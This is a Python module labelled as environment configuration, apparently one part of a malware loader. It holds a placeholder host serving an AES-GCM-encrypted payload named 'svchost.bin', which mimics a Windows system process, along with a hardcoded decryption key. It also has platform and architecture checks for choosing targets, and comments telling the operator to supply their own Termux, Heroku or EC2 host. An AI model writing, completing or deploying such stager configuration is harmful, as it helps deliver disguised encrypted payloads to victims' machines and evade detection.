# -*- coding: utf-8 -*-
"""
Environment configuration — system capabilities, service endpoints, and credentials.
"""
import sys
import struct
import platform

_SUPPORTED_PLATFORMS = {"win32", "linux", "darwin"}

_ARCH_LABELS = {
    "AMD64": "x64", "x86_64": "x64",
    "x86": "x86", "i686": "x86",
    "ARM64": "arm64", "aarch64": "arm64",
}

# Endpoint serving the AES-GCM-wrapped payload.
# Your Termux/Heroku/EC2 host. Must return raw encrypted bytes.
_ENDPOINT = "https://your-host.example.com/svchost.bin"

# 32-byte AES-256-GCM key, 64 hex characters.
_KEY_HEX = "590da1b680437579a4b18c1b59bbb69fd4ea6818cc28a5427ca81e525d959c80"

# Wire format of the served blob:
#   base64( nonce[12] || ciphertext || tag[16] )
# Set RAW_BYTES = True if the server streams the bytes without base64.
RAW_BYTES = False

# HTTP request timeout (seconds).
TIMEOUT = 30


def get_platform_info():
    return {
        "os": sys.platform,
        "arch": platform.machine(),
        "python": platform.python_version(),
        "bits": struct.calcsize("P") * 8,
        "impl": platform.python_implementation(),
    }


def check_version(minimum=(3, 8)):
    return sys.version_info[:2] >= minimum


def arch_label():
    m = platform.machine().upper()
    return _ARCH_LABELS.get(m, m.lower())


def is_supported():
    return sys.platform in _SUPPORTED_PLATFORMS


def fetch_endpoint():
    """Return the payload endpoint URL."""
    return _ENDPOINT


def load_credentials():
    """Return the AES key as a 32-byte blob."""
    return bytes.fromhex(_KEY_HEX)
